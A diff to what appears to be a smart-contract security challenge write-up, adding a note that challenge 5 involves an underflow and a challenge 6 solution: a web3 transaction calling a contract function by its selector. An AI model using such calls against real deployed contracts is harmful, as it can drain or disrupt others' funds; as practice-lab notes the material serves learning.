@@ -66,3 +66,11 @@ contract Attack {
 ### challenge 5
 
 Underflow and has to be called by someone else
+
+### challenge 6
+
+await window.web3.eth.sendTransaction({
+    from: '0xD0eba5f813cEfa1FD5f60E11feCD84f39a9dDA88',
+    to: '0x601D70A2fFAC4C90A3D4c4931564EE3d857d39F8',
+    data: '0xdd365b8b'
+})
